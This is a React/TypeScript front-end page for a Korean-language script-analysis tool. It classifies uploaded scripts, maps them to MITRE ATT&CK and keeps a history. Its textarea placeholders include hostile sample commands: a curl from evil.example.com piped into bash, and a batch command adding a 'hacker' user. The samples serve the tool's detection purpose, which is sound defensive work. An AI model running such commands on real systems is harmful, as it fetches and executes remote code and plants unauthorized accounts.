"use client";
import { useState, useEffect, useCallback } from "react";
import { analyzeFile, fetchHealth, AnalysisResult, HealthResponse } from "@/lib/api";
import FileUpload from "@/components/FileUpload";
import ReportPanel from "@/components/ReportPanel";

type Phase = "idle" | "loading" | "done" | "error";
const STEPS = ["전처리", "로컬 AI 분석", "위험도 판단", "리포트 생성"] as const;

interface HistoryEntry {
  resultId: string;
  filename: string;
  timestamp: number;
  riskLevel: string;
  riskScore: number;
  scenarioId: string | null;
  result: AnalysisResult;
}
const HISTORY_KEY = "malscript_history";
const HISTORY_MAX = 20;

function loadHistory(): HistoryEntry[] {
  try { return JSON.parse(localStorage.getItem(HISTORY_KEY) ?? "[]"); }
  catch { return []; }
}
function saveHistory(entries: HistoryEntry[]) {
  localStorage.setItem(HISTORY_KEY, JSON.stringify(entries.slice(0, HISTORY_MAX)));
}
function pushHistory(entry: HistoryEntry) {
  const prev = loadHistory().filter(e => e.resultId !== entry.resultId);
  saveHistory([entry, ...prev]);
}

const RISK_COLOR: Record<string, string> = {
  safe: "#4ade80", medium: "#fbbf24", high: "#fb923c", critical: "#f87171",
};
const RISK_BG: Record<string, string> = {
  safe: "rgba(74,222,128,0.07)", medium: "rgba(251,191,36,0.07)",
  high: "rgba(251,146,60,0.07)", critical: "rgba(248,113,113,0.07)",
};
const RISK_BORDER: Record<string, string> = {
  safe: "rgba(74,222,128,0.25)", medium: "rgba(251,191,36,0.25)",
  high: "rgba(251,146,60,0.25)", critical: "rgba(248,113,113,0.25)",
};

const BASE = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:8000";

type InputMode = "file" | "text" | "both";
const SCRIPT_EXTS = [".ps1", ".bat", ".sh", ".py", ".js", ".ts", ".vbs"];
const EXT_PLACEHOLDER: Record<string, string> = {
  ".ps1": "# PowerShell\nGet-Process | Where-Object { $_.CPU -gt 100 }",
  ".bat": "@echo off\nnet user hacker P@ss /add",
  ".sh":  "#!/bin/bash\ncurl -s http://evil.example.com/payload | bash",
  ".py":  "import subprocess\nsubprocess.run(['cmd','/c','whoami'])",
  ".js":  "const { exec } = require('child_process');\nexec('whoami');",
  ".ts":  "import { execSync } from 'child_process';\nexecSync('id');",
  ".vbs": 'Set obj = CreateObject("WScript.Shell")\nobj.Run "cmd /c whoami"',
};

/** 코드 내용을 분석해 가장 유력한 스크립트 확장자를 반환 */
function detectScriptType(code: string): string {
  if (!code.trim()) return ".ps1";

  const scores: Record<string, number> = {
    ".ps1": 0, ".bat": 0, ".sh": 0, ".py": 0, ".js": 0, ".ts": 0, ".vbs": 0,
  };

  // ── Shebang ──────────────────────────────────────────────────────────────
  const firstLine = code.split("\n")[0].trim();
  if (firstLine.startsWith("#!")) {
    if (/python/.test(firstLine)) return ".py";
    if (/bash|sh/.test(firstLine)) return ".sh";
    if (/node/.test(firstLine)) return ".js";
  }

  // ── PowerShell ────────────────────────────────────────────────────────────
  if (/Get-\w+|Set-\w+|New-\w+|Invoke-\w+|Write-Host|Write-Output|Add-\w+/i.test(code)) scores[".ps1"] += 5;
  if (/-ExecutionPolicy|-NonInteractive|-WindowStyle|-EncodedCommand/i.test(code)) scores[".ps1"] += 4;
  if (/\$env:\w+|\$PSVersion|\[System\.\w+\]/i.test(code)) scores[".ps1"] += 3;
  if (/param\s*\(|foreach\s*\(\s*\$|\|Where-Object|\|Select-Object/i.test(code)) scores[".ps1"] += 2;
  if (/\.ps1\b/i.test(code)) scores[".ps1"] += 2;

  // ── Batch ─────────────────────────────────────────────────────────────────
  if (/@echo\s+(off|on)/i.test(code)) scores[".bat"] += 7;
  if (/^set\s+\w+=/im.test(code)) scores[".bat"] += 3;
  if (/^goto\s+\w+|^:\w+/im.test(code)) scores[".bat"] += 4;
  if (/^if\s+errorlevel|^endlocal|^setlocal/im.test(code)) scores[".bat"] += 3;
  if (/%~dp0|%[A-Za-z0-9_]+%/.test(code)) scores[".bat"] += 3;
  if (/^rem\s/im.test(code)) scores[".bat"] += 2;

  // ── Shell ─────────────────────────────────────────────────────────────────
  if (/\bchmod\s|\bchown\s|\bsudo\s|\bapt-get\s|\byum\s|\bwget\s/i.test(code)) scores[".sh"] += 4;
  if (/\bexport\s+\w+=|\bsource\s+|\b\.\s+\//i.test(code)) scores[".sh"] += 3;
  if (/\$\([^)]+\)|\bfi\b|\bdo\b|\bdone\b|\besac\b/i.test(code)) scores[".sh"] += 2;
  if (/\bthen\b|\bfor\s+\w+\s+in\s+/i.test(code)) scores[".sh"] += 2;

  // ── Python ────────────────────────────────────────────────────────────────
  if (/^import\s+\w+|^from\s+\w+\s+import/im.test(code)) scores[".py"] += 6;
  if (/def\s+\w+\s*\(|class\s+\w+\s*[:(]/i.test(code)) scores[".py"] += 4;
  if (/__name__\s*==\s*['"]__main__['"]/i.test(code)) scores[".py"] += 7;
  if (/subprocess\.|os\.system\(|print\s*\(/i.test(code)) scores[".py"] += 2;

  // ── JavaScript ───────────────────────────────────────────────────────────
  if (/require\s*\(|module\.exports|process\.env\.|__dirname/i.test(code)) scores[".js"] += 5;
  if (/^(const|let|var)\s+\w+\s*=/im.test(code)) scores[".js"] += 3;
  if (/=>\s*[{(]|\.then\s*\(|async\s+function/i.test(code)) scores[".js"] += 2;
  if (/console\.(log|error|warn|info)/i.test(code)) scores[".js"] += 2;

  // ── TypeScript (JS 점수 상속) ──────────────────────────────────────────────
  scores[".ts"] = scores[".js"] * 0.4;
  if (/:\s*(string|number|boolean|void|any|never)\b/i.test(code)) scores[".ts"] += 5;
  if (/\binterface\s+\w+\s*\{|\btype\s+\w+\s*=/i.test(code)) scores[".ts"] += 5;
  if (/<[A-Z]\w*>|as\s+(string|number|any)/i.test(code)) scores[".ts"] += 2;

  // ── VBScript ──────────────────────────────────────────────────────────────
  if (/\bDim\s+\w+\b/i.test(code)) scores[".vbs"] += 4;
  if (/WScript\.\w+|CreateObject\s*\(/i.test(code)) scores[".vbs"] += 6;
  if (/\bMsgBox\s*[("']|\bInputBox\s*[("']/i.test(code)) scores[".vbs"] += 4;
  if (/\bSub\s+\w+|\bEnd\s+Sub\b|\bFunction\s+\w+/i.test(code)) scores[".vbs"] += 2;

  const best = Object.entries(scores).reduce((a, b) => (a[1] > b[1] ? a : b));
  return best[1] > 0 ? best[0] : ".ps1";
}

export default function Page() {
  const [phase,         setPhase]         = useState<Phase>("idle");
  const [step,          setStep]          = useState(0);
  const [result,        setResult]        = useState<AnalysisResult | null>(null);
  const [resultId,      setResultId]      = useState<string | null>(null);
  const [errMsg,        setErrMsg]        = useState("");
  const [health,        setHealth]        = useState<HealthResponse | null>(null);
  const [history,       setHistory]       = useState<HistoryEntry[]>([]);
  const [histOpen,      setHistOpen]      = useState(false);
  const [reportLoading, setReportLoading] = useState(false);
  const [inputMode,     setInputMode]     = useState<InputMode>("file");
  const [textContent,   setTextContent]   = useState("");
  const [textExt,       setTextExt]       = useState(".ps1");
  const [autoDetect,    setAutoDetect]    = useState(true);
  const [pendingFile,   setPendingFile]   = useState<File | null>(null);

  useEffect(() => { setHistory(loadHistory()); }, []);

  useEffect(() => {
    const check = () => fetchHealth().then(setHealth).catch(() => setHealth(null));
    check();
    const id = setInterval(check, 5000);
    return () => clearInterval(id);
  }, []);

  // 직접 입력 자동 감지 — 내용이 바뀔 때마다 타입을 추론
  useEffect(() => {
    if (!autoDetect) return;
    if (textContent.trim().length < 5) { setTextExt(".ps1"); return; }
    const detected = detectScriptType(textContent);
    setTextExt(detected);
  }, [textContent, autoDetect]);

  const downloadReport = async () => {
    if (!resultId) return;
    setReportLoading(true);
    try {
      const p = new URLSearchParams({ result_id: resultId });
      if (scenarioId) p.set("scenario_id", scenarioId);
      const res = await fetch(`${BASE}/reports/generate?${p}`);
      if (!res.ok) { alert("보고서 생성 실패: " + await res.text()); return; }
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url; a.download = `report_${result?.filename ?? resultId}.pdf`; a.click();
      URL.revokeObjectURL(url);
    } catch (e) { alert("오류: " + e); }
    finally { setReportLoading(false); }
  };

  async function handleFile(file: File) {
    setPhase("loading"); setResult(null); setErrMsg(""); setStep(0); setResultId(null);
    const t1 = setTimeout(() => setStep(1), 400);
    const t2 = setTimeout(() => setStep(2), 900);
    const t3 = setTimeout(() => setStep(3), 1400);
    try {
      const res = await analyzeFile(file);
      clearTimeout(t1); clearTimeout(t2); clearTimeout(t3);
      setStep(3);
      if (!res.success || !res.result) throw new Error(res.error ?? "분석 실패");
      const r = res.result;
      const rid = res.result_id ?? crypto.randomUUID().slice(0, 8);
      setResult(r); setResultId(rid); setPhase("done");
      const entry: HistoryEntry = {
        resultId: rid, filename: r.filename, timestamp: Date.now(),
        riskLevel: r.local.risk_level, riskScore: r.local.risk_score,
        scenarioId: r.scenario_id ?? null, result: r,
      };
      pushHistory(entry); setHistory(loadHistory());
    } catch (e: unknown) {
      clearTimeout(t1); clearTimeout(t2); clearTimeout(t3);
      setErrMsg(e instanceof Error ? e.message : "알 수 없는 오류");
      setPhase("error");
    }
  }

  async function handleTextSubmit() {
    if (!textContent.trim()) {
      setErrMsg("스크립트 내용을 입력하세요."); setPhase("error"); return;
    }
    const fname = `script${textExt}`;
    const blob = new Blob([textContent], { type: "text/plain" });
    const file = new File([blob], fname, { type: "text/plain" });
    await handleFile(file);
  }

  async function handleBothSubmit() {
    if (!pendingFile && !textContent.trim()) {
      setErrMsg("파일을 업로드하거나 텍스트를 입력하세요."); setPhase("error"); return;
    }
    if (pendingFile && textContent.trim()) {
      const reader = new FileReader();
      reader.onload = async (e) => {
        const fileContent = (e.target?.result as string) ?? "";
        const combined = fileContent + "\n\n# === 추가 직접 입력 ===\n" + textContent;
        const blob = new Blob([combined], { type: "text/plain" });
        const merged = new File([blob], pendingFile.name, { type: "text/plain" });
        await handleFile(merged);
      };
      reader.readAsText(pendingFile);
    } else if (pendingFile) {
      await handleFile(pendingFile);
    } else {
      await handleTextSubmit();
    }
  }

  const handleRestore = useCallback((entry: HistoryEntry) => {
    setResult(entry.result); setResultId(entry.resultId);
    setPhase("done"); setErrMsg("");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, []);

  const handleDelete = useCallback((id: string) => {
    const next = loadHistory().filter(e => e.resultId !== id);
    saveHistory(next); setHistory(next);
  }, []);

  const riskLevel  = result?.local.risk_level ?? "safe";
  const riskColor  = RISK_COLOR[riskLevel]  ?? "#8a8f98";
  const riskBg     = RISK_BG[riskLevel]     ?? "transparent";
  const riskBorder = RISK_BORDER[riskLevel] ?? "var(--hairline)";
  const hasLLM     = result && !result.llm_skipped;
  const scenarioId = result?.scenario_id ?? null;

  return (
    <main style={{ minHeight: "100vh", fontFamily: "var(--font-sans)", color: "var(--ink)" }}>
      <div style={{ maxWidth: 920, margin: "0 auto", padding: "2rem 1.5rem 5rem" }}>

        {/* Header */}
        <div style={{ marginBottom: "2rem" }}>
          <h1 style={{ color: "var(--ink)", margin: "0 0 0.5rem",
            fontSize: "1.35rem", fontWeight: 600, letterSpacing: "-0.03em" }}>
            Script Analyzer
          </h1>
          <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginBottom: "0.5rem", flexWrap: "wrap" as const }}>
            <StatusDot ok={!!health} label={health ? "API 연결됨" : "API 미연결"} />
            <span style={{ width: 1, height: 10, background: "var(--hairline-strong)", flexShrink: 0 }} />
            <StatusDot ok={!!health?.ollama_available} warn={true}
              label={health?.ollama_available ? `Ollama: ${health.model_loaded}` : "Ollama 미연결"} />
          </div>
          <p style={{ color: "var(--ink-subtle)", fontSize: "0.8rem", margin: 0, lineHeight: 1.6 }}>
            PowerShell · JavaScript · Python · VBScript · BAT · SH 업로드 →
            로컬 AI 1차 분류 → Claude API MITRE ATT&amp;CK 매핑 + 시나리오 자동 생성
          </p>
        </div>

        {/* 입력 모드 토글 */}
        <div style={{ display: "flex", gap: 0, marginBottom: "1rem",
          border: "1px solid var(--hairline)", borderRadius: "var(--radius-md)", overflow: "hidden" }}>
          {([
            { id: "file" as InputMode, label: "파일 업로드" },
            { id: "text" as InputMode, label: "직접 입력" },
            { id: "both" as InputMode, label: "파일 + 입력" },
          ]).map((m, i) => (
            <button key={m.id} onClick={() => setInputMode(m.id)}
              disabled={phase === "loading"}
              style={{
                flex: 1, padding: "0.55rem 0.5rem",
                fontSize: "12px", fontWeight: inputMode === m.id ? 500 : 400,
                letterSpacing: "-0.01em",
                background: inputMode === m.id ? "var(--surface-2)" : "transparent",
                color: inputMode === m.id ? "var(--ink)" : "var(--ink-subtle)",
                border: "none",
                borderRight: i < 2 ? "1px solid var(--hairline)" : "none",
                cursor: phase === "loading" ? "not-allowed" : "pointer",
                fontFamily: "var(--font-sans)",
                transition: "all 0.15s",
              }}>
              {m.label}
            </button>
          ))}
        </div>

        {/* 파일 업로드 */}
        {(inputMode === "file" || inputMode === "both") && (
          <div style={{ marginBottom: inputMode === "both" ? "1rem" : 0 }}>
            {inputMode === "both" && (
              <p style={{ color: "var(--ink-tertiary)", fontSize: "0.73rem", margin: "0 0 0.4rem" }}>
                ① 파일 업로드 (선택)
              </p>
            )}
            <FileUpload
              onFile={inputMode === "file" ? handleFile : (f) => setPendingFile(f)}
              disabled={phase === "loading"}
            />
            {inputMode === "both" && pendingFile && (
              <div style={{ marginTop: "0.5rem", padding: "0.4rem 0.75rem",
                background: "rgba(74,222,128,0.05)",
                border: "1px solid rgba(74,222,128,0.2)",
                borderRadius: "var(--radius-sm)",
                fontSize: "0.78rem", color: "#4ade80", display: "flex", alignItems: "center" }}>
                <span>✓ {pendingFile.name} ({(pendingFile.size / 1024).toFixed(1)} KB)</span>
                <button onClick={() => setPendingFile(null)}
                  style={{ marginLeft: "auto", background: "none", border: "none",
                    cursor: "pointer", color: "var(--ink-tertiary)", fontSize: "0.75rem" }}>✕</button>
              </div>
            )}
          </div>
        )}

        {/* 직접 입력 */}
        {(inputMode === "text" || inputMode === "both") && (
          <div style={{ marginBottom: "1rem" }}>
            {inputMode === "both" && (
              <p style={{ color: "var(--ink-tertiary)", fontSize: "0.73rem", margin: "0 0 0.4rem" }}>
                ② 직접 입력 (선택 — 파일과 합쳐서 분석)
              </p>
            )}
            <div style={{ border: "1px solid var(--hairline)",
              borderRadius: "var(--radius-md)", background: "var(--surface-1)", overflow: "hidden" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.75rem",
                padding: "0.5rem 0.85rem", borderBottom: "1px solid var(--hairline)",
                background: "var(--surface-2)" }}>
                <span style={{ color: "var(--ink-tertiary)", fontSize: "0.73rem" }}>스크립트 타입:</span>
                <select value={textExt}
                  onChange={e => { setTextExt(e.target.value); setAutoDetect(false); }}
                  disabled={phase === "loading"}
                  style={{ background: "var(--surface-3)", color: "var(--primary-hover)",
                    border: "1px solid var(--hairline-strong)", borderRadius: "var(--radius-xs)",
                    padding: "2px 6px", fontSize: "12px",
                    fontFamily: "var(--font-mono)", cursor: "pointer" }}>
                  {SCRIPT_EXTS.map(ext => <option key={ext} value={ext}>{ext}</option>)}
                </select>
                {autoDetect ? (
                  <span style={{ fontSize: "0.68rem", padding: "1px 6px",
                    background: "var(--primary-muted, rgba(99,102,241,0.12))",
                    color: "var(--primary)", borderRadius: "999px",
                    border: "1px solid var(--primary-muted, rgba(99,102,241,0.25))" }}>
                    자동 감지
                  </span>
                ) : (
                  <button onClick={() => { setAutoDetect(true); if (textContent.trim().length >= 5) setTextExt(detectScriptType(textContent)); }}
                    title="자동 감지 모드로 되돌리기"
                    style={{ fontSize: "0.68rem", padding: "1px 6px",
                      background: "var(--surface-3)", color: "var(--ink-tertiary)",
                      border: "1px solid var(--hairline-strong)", borderRadius: "999px",
                      cursor: "pointer" }}>
                    수동 ↺
                  </button>
                )}
                <span style={{ color: "var(--ink-tertiary)", fontSize: "0.72rem", marginLeft: "auto" }}>
                  {textContent.length > 0
                    ? `${textContent.length} chars / ${textContent.split("\n").length} lines`
                    : "스크립트를 붙여넣거나 직접 작성하세요"}
                </span>
              </div>
              <textarea
                value={textContent}
                onChange={e => setTextContent(e.target.value)}
                disabled={phase === "loading"}
                placeholder={EXT_PLACEHOLDER[textExt] ?? "# 스크립트를 여기에 입력하세요"}
                spellCheck={false}
                style={{ width: "100%", minHeight: 200, padding: "0.75rem 0.85rem",
                  background: "transparent", color: "var(--ink-muted)",
                  border: "none", outline: "none", resize: "vertical",
                  fontFamily: "var(--font-mono)", fontSize: "12.5px", lineHeight: 1.7,
                  boxSizing: "border-box", opacity: phase === "loading" ? 0.5 : 1 }}
              />
            </div>
            {inputMode === "text" && (
              <button onClick={handleTextSubmit}
                disabled={phase === "loading" || !textContent.trim()}
                style={{ marginTop: "0.75rem", width: "100%", padding: "0.6rem",
                  background: textContent.trim() ? "var(--primary)" : "var(--surface-2)",
                  color: textContent.trim() ? "#fff" : "var(--ink-tertiary)",
                  border: "1px solid " + (textContent.trim() ? "var(--primary)" : "var(--hairline)"),
                  borderRadius: "var(--radius-sm)", fontSize: "13px", fontWeight: 500,
                  cursor: !textContent.trim() ? "not-allowed" : "pointer",
                  fontFamily: "var(--font-sans)", transition: "all 0.15s" }}>
                스크립트 분석 시작
              </button>
            )}
          </div>
        )}

        {/* 둘 다 모드 버튼 */}
        {inputMode === "both" && (
          <button onClick={handleBothSubmit}
            disabled={phase === "loading" || (!pendingFile && !textContent.trim())}
            style={{ width: "100%", marginBottom: "1rem", padding: "0.6rem",
              background: (!pendingFile && !textContent.trim()) ? "var(--surface-2)" : "var(--primary)",
              color: (!pendingFile && !textContent.trim()) ? "var(--ink-tertiary)" : "#fff",
              border: "1px solid var(--hairline)",
              borderRadius: "var(--radius-sm)", fontSize: "13px", fontWeight: 500,
              cursor: (phase === "loading" || (!pendingFile && !textContent.trim())) ? "not-allowed" : "pointer",
              opacity: (!pendingFile && !textContent.trim()) ? 0.5 : 1,
              fontFamily: "var(--font-sans)", transition: "all 0.15s" }}>
            합쳐서 분석 시작
            {pendingFile && textContent.trim() && (
              <span style={{ color: "rgba(255,255,255,0.55)", fontSize: "0.73rem", marginLeft: "0.75rem" }}>
                (파일 + 직접 입력 합산)
              </span>
            )}
          </button>
        )}

        {/* 분석 이력 */}
        {history.length > 0 && (
          <div style={{ marginTop: "1.25rem", border: "1px solid var(--hairline)",
            borderRadius: "var(--radius-md)", background: "var(--surface-1)", overflow: "hidden" }}>
            <button onClick={() => setHistOpen(v => !v)}
              style={{ width: "100%", display: "flex", alignItems: "center",
                justifyContent: "space-between", padding: "0.6rem 0.85rem",
                background: "none", border: "none", cursor: "pointer",
                color: "var(--ink-subtle)", fontFamily: "var(--font-sans)" }}>
              <span style={{ fontSize: "11px", fontWeight: 600,
                letterSpacing: "0.07em", textTransform: "uppercase" }}>
                Analysis History
                <span style={{ marginLeft: 8,
                  background: "var(--primary-muted)", color: "var(--primary-hover)",
                  borderRadius: "var(--radius-full)", padding: "1px 7px",
                  fontSize: "10px", fontWeight: 600 }}>
                  {history.length}
                </span>
              </span>
              <div style={{ display: "flex", alignItems: "center", gap: "0.75rem" }}>
                {histOpen && (
                  <button onClick={e => { e.stopPropagation(); saveHistory([]); setHistory([]); }}
                    style={{ background: "none", border: "1px solid var(--hairline-strong)",
                      cursor: "pointer", color: "var(--ink-tertiary)", fontSize: "11px",
                      fontFamily: "var(--font-sans)", padding: "2px 8px",
                      borderRadius: "var(--radius-xs)" }}>
                    전체 삭제
                  </button>
                )}
                <span style={{ fontSize: "0.72rem", color: "var(--ink-tertiary)" }}>
                  {histOpen ? "▲" : "▼"}
                </span>
              </div>
            </button>
            {histOpen && (
              <div style={{ borderTop: "1px solid var(--hairline)" }}>
                {history.map(e => {
                  const rc = RISK_COLOR[e.riskLevel] ?? "#8a8f98";
                  const rb = RISK_BG[e.riskLevel] ?? "transparent";
                  const rd = RISK_BORDER[e.riskLevel] ?? "var(--hairline)";
                  const dt = new Date(e.timestamp);
                  const ts = dt.toLocaleDateString("ko-KR", { month: "2-digit", day: "2-digit" })
                    + " " + dt.toLocaleTimeString("ko-KR", { hour: "2-digit", minute: "2-digit" });
                  return (
                    <div key={e.resultId}
                      style={{ display: "flex", alignItems: "center",
                        padding: "0.5rem 0.85rem",
                        borderBottom: "1px solid var(--hairline)", gap: "0.75rem" }}>
                      <button onClick={() => handleRestore(e)}
                        style={{ flex: 1, display: "flex", alignItems: "center", gap: "0.75rem",
                          background: "none", border: "none", cursor: "pointer", textAlign: "left" }}>
                        <span style={{ fontSize: "10px", fontWeight: 700, color: rc,
                          border: "1px solid " + rd, borderRadius: "var(--radius-xs)",
                          padding: "2px 5px", background: rb,
                          minWidth: "5ch", textAlign: "center", letterSpacing: "0.04em" }}>
                          {e.riskLevel.toUpperCase()}
                        </span>
                        <span style={{ color: "var(--ink-muted)", fontSize: "13px",
                          overflow: "hidden", textOverflow: "ellipsis",
                          whiteSpace: "nowrap", maxWidth: 240 }}>
                          {e.filename}
                        </span>
                        {e.scenarioId && <span className="badge badge-primary">시나리오</span>}
                        <span style={{ marginLeft: "auto", color: "var(--ink-tertiary)",
                          fontSize: "11px", flexShrink: 0 }}>{ts}</span>
                      </button>
                      <button onClick={() => handleDelete(e.resultId)}
                        style={{ background: "none", border: "none", cursor: "pointer",
                          color: "var(--ink-tertiary)", fontSize: "0.75rem", padding: "2px 6px",
                          borderRadius: "var(--radius-xs)", transition: "color 0.15s" }}
                        onMouseEnter={e2 => (e2.currentTarget.style.color = "#f87171")}
                        onMouseLeave={e2 => (e2.currentTarget.style.color = "var(--ink-tertiary)")}>
                        ✕
                      </button>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}

        {/* 파이프라인 진행 */}
        {phase === "loading" && (
          <div style={{ marginTop: "1.25rem", background: "var(--surface-1)",
            border: "1px solid var(--hairline)", borderRadius: "var(--radius-md)", padding: "1.1rem" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginBottom: "1rem" }}>
              <span style={{ display: "inline-block", width: 10, height: 10,
                borderRadius: "50%", border: "2px solid var(--primary)",
                borderTopColor: "transparent",
                animation: "spin 0.8s linear infinite", flexShrink: 0 }}/>
              <span style={{ fontSize: "11px", color: "var(--ink-subtle)",
                letterSpacing: "0.07em", textTransform: "uppercase", fontWeight: 600 }}>
                Analyzing
              </span>
            </div>
            <div style={{ display: "flex", gap: "0.4rem" }}>
              {STEPS.map((s, i) => {
                const done = i < step, current = i === step;
                return (
                  <div key={s} style={{ flex: 1, padding: "0.5rem 0.6rem",
                    background: done ? "rgba(74,222,128,0.05)"
                      : current ? "var(--primary-glow)" : "transparent",
                    border: "1px solid " + (done ? "rgba(74,222,128,0.2)"
                      : current ? "rgba(94,106,210,0.3)" : "var(--hairline)"),
                    borderRadius: "var(--radius-sm)", transition: "all 0.3s" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: "0.35rem" }}>
                      <span style={{ width: 5, height: 5, borderRadius: "50%", flexShrink: 0,
                        background: done ? "#4ade80" : current ? "var(--primary)" : "var(--hairline-strong)",
                        display: "inline-block" }}/>
                      <span style={{ fontSize: "11px",
                        color: done ? "#4ade80" : current ? "var(--primary-hover)" : "var(--ink-tertiary)" }}>
                        {s}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* 오류 */}
        {phase === "error" && (
          <div style={{ marginTop: "1.25rem", padding: "1rem 1.1rem",
            background: "rgba(248,113,113,0.05)",
            border: "1px solid rgba(248,113,113,0.2)",
            borderRadius: "var(--radius-md)" }}>
            <p style={{ fontSize: "11px", color: "#f87171", margin: "0 0 0.4rem",
              letterSpacing: "0.07em", textTransform: "uppercase", fontWeight: 600 }}>Error</p>
            <p style={{ color: "var(--ink-muted)", fontSize: "13px",
              margin: "0 0 0.75rem", lineHeight: 1.6 }}>{errMsg}</p>
            <button onClick={() => setPhase("idle")}
              style={{ fontSize: "12px", color: "var(--ink-subtle)",
                background: "none", border: "1px solid var(--hairline-strong)",
                borderRadius: "var(--radius-xs)",
                padding: "4px 12px", cursor: "pointer", fontFamily: "var(--font-sans)" }}>
              다시 시도
            </button>
          </div>
        )}

        {/* 분석 결과 */}
        {phase === "done" && result && (
          <div style={{ marginTop: "1.75rem" }} className="animate-fade-in">
            <div style={{ display: "flex", alignItems: "center",
              justifyContent: "space-between", marginBottom: "1rem",
              flexWrap: "wrap", gap: "0.5rem" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                <span style={{ fontSize: "11px", color: "var(--ink-subtle)",
                  letterSpacing: "0.07em", textTransform: "uppercase", fontWeight: 600 }}>
                  Analysis Result
                </span>
                <span style={{ fontSize: "11px", fontWeight: 700, color: riskColor,
                  border: "1px solid " + riskBorder,
                  borderRadius: "var(--radius-full)",
                  padding: "2px 9px", background: riskBg, letterSpacing: "0.04em" }}>
                  {riskLevel.toUpperCase()}
                </span>
                {resultId && (
                  <span style={{ fontSize: "11px", color: "var(--ink-subtle)",
                    background: "var(--surface-2)", border: "1px solid var(--hairline)",
                    borderRadius: "var(--radius-xs)", padding: "2px 8px",
                    fontFamily: "var(--font-mono)" }}>
                    {resultId}
                  </span>
                )}
              </div>
              <button onClick={() => { setPhase("idle"); setResult(null); setResultId(null); }}
                className="btn-ghost" style={{ fontSize: "12px" }}>
                새 파일 분석
              </button>
            </div>

            <ReportPanel result={result} />

            {(hasLLM || riskLevel !== "safe") && (
              <div style={{ marginTop: "1.25rem", padding: "1rem 1.1rem",
                background: "var(--surface-1)", border: "1px solid var(--hairline)",
                borderRadius: "var(--radius-md)" }}>
                <p style={{ fontSize: "11px", color: "var(--ink-subtle)",
                  letterSpacing: "0.07em", textTransform: "uppercase",
                  fontWeight: 600, margin: "0 0 0.85rem" }}>Next Steps</p>
                <div style={{ display: "flex", flexWrap: "wrap", gap: "0.5rem" }}>
                  {scenarioId ? (
                    <a href={"/scenario?scenario_id=" + scenarioId}
                      className="btn-primary" style={{ fontSize: "12px" }}>
                      시나리오 확인 →
                    </a>
                  ) : resultId ? (
                    <a href={"/scenario?result_id=" + resultId}
                      className={hasLLM ? "btn-primary" : "btn-ghost"}
                      style={{ fontSize: "12px" }}>
                      시나리오 생성 →
                    </a>
                  ) : null}
                  {scenarioId && (
                    <a href={"/simulation?scenario_id=" + scenarioId}
                      className="btn-ghost" style={{ fontSize: "12px" }}>
                      시뮬레이션 실행 →
                    </a>
                  )}
                  <a href="/lab" className="btn-ghost" style={{ fontSize: "12px" }}>
                    Docker 랩 시작 →
                  </a>
                  {resultId && (
                    <button onClick={downloadReport} disabled={reportLoading}
                      className="btn-ghost"
                      style={{ fontSize: "12px",
                        color: reportLoading ? "var(--ink-tertiary)" : "#4ade80",
                        borderColor: reportLoading ? "var(--hairline)" : "rgba(74,222,128,0.3)" }}>
                      {reportLoading ? "⏳ 생성 중..." : "📄 PDF 보고서"}
                    </button>
                  )}
                  {result.vulnerabilities && (
                    <span style={{ display: "inline-flex", alignItems: "center",
                      padding: "0.4rem 0.75rem", fontSize: "12px",
                      borderRadius: "var(--radius-xs)", color: "#fbbf24",
                      border: "1px solid rgba(251,191,36,0.25)",
                      background: "rgba(251,191,36,0.07)" }}>
                      ⚠ 취약점 {result.vulnerabilities.vulnerabilities.length}개
                      ({result.vulnerabilities.highest_severity})
                    </span>
                  )}
                </div>
                {scenarioId && (
                  <p style={{ fontSize: "11px", color: "#4ade80", margin: "0.75rem 0 0" }}>
                    ✓ 시나리오 자동 생성됨 —{" "}
                    <span style={{ fontFamily: "var(--font-mono)",
                      color: "var(--primary-hover)" }}>{scenarioId}</span>
                  </p>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </main>
  );
}

function StatusDot({ ok, warn, label }: { ok: boolean; warn?: boolean; label: string }) {
  const color = ok ? "#4ade80" : (warn ? "#fbbf24" : "#f87171");
  return (
    <div style={{ display: "flex", alignItems: "center", gap: "0.4rem" }}>
      <span style={{ width: 6, height: 6, borderRadius: "50%", flexShrink: 0,
        background: color, display: "inline-block",
        boxShadow: ok ? ("0 0 5px " + color) : "none" }}/>
      <span style={{ fontSize: "11px", color, fontWeight: 500 }}>{label}</span>
    </div>
  );
}
